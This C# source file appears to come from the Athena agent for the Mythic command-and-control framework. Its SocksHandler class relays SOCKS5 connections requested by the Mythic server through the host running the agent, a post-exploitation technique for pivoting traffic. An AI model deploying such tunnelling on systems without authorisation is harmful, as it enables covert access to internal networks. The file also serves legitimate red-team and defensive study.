using Agent.Models.Commands;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;
using Agent.Models.Proxy;
using Agent.Interfaces;

namespace Agent.Managers
{
    public class SocksHandler
    {
        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
        public IMessageManager messageManager { get; set; }
        public SocksHandler(IMessageManager messageManager)
        {
            this.messageManager = messageManager;
            connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(AthenaSocksConnection conn)
        {
            return connections.TryAdd(conn.server_id, conn);
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(MythicDatagram sm)
        {
            if (!connections.ContainsKey(sm.server_id)) //Check if this is a new connection
            {
                if (!sm.exit)
                {
                    await HandleNewConnection(sm); //Add new connection
                }
                return;
            }

            //We already know about this packet, so lets continue

            if (!string.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
            {
                if (connections[sm.server_id].IsConnected()) //Check if our connection is alive
                {
                    connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
                }
            }

            if (sm.exit) //Finally, let's see if exit was set to true
            {
                if (connections[sm.server_id].IsConnected())
                {
                    connections[sm.server_id].exited = true;
                    connections[sm.server_id].client.Disconnect(); //We are, so let's issue the disconnect
                }
                AthenaSocksConnection ac;
                if (connections.TryRemove(sm.server_id, out ac))//Finally, remove the session from our tracker and dispose of the client
                {
                    if (ac.client is not null)
                    {
                        ac.client.Dispose();
                    }
                }
            }
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(MythicDatagram sm)
        {
            try
            {
                if (string.IsNullOrEmpty(sm.data)) //We got an empty packet even though we should be recieving connect data.
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet 
                if (!co.Parse()) //Check if parsing succeeded or not
                {
                    ReturnMessageFailure(co.server_id); //Packet parse failed.
                    return;
                }

                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect
                await AddConnection(sc); //Add our connection to the Dictionary;

                sc.client.RunAsync(); //Connect to the endpoint
            }
            catch
            {
                ReturnMessageFailure(sm.server_id);
            }
        }

        public async void ReturnMessageFailure(int id)
        {
            await messageManager.AddProxyMessageAsync(
                DatagramSource.Socks5,
                new MythicDatagram(
                    id,
                    new ConnectResponse
                    {
                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                        bndport = new byte[] { 0x00, 0x00 },
                        addrtype = (byte)AddressType.IPv4,
                        status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }

        public void GetSocksMessages()
        {
            if (connections.Count < 1)
            {
                return;
            }

            foreach (var conn in connections)
            {
                List<MythicDatagram> returnMessages = conn.Value.GetMessages(); 
                foreach (var msg in returnMessages)
                {
                    messageManager.AddProxyMessageAsync(DatagramSource.Socks5, msg);
                    if (msg.exit)
                    {
                        connections.TryRemove(msg.server_id, out _);
                    }
                }
            }
        }
    }
}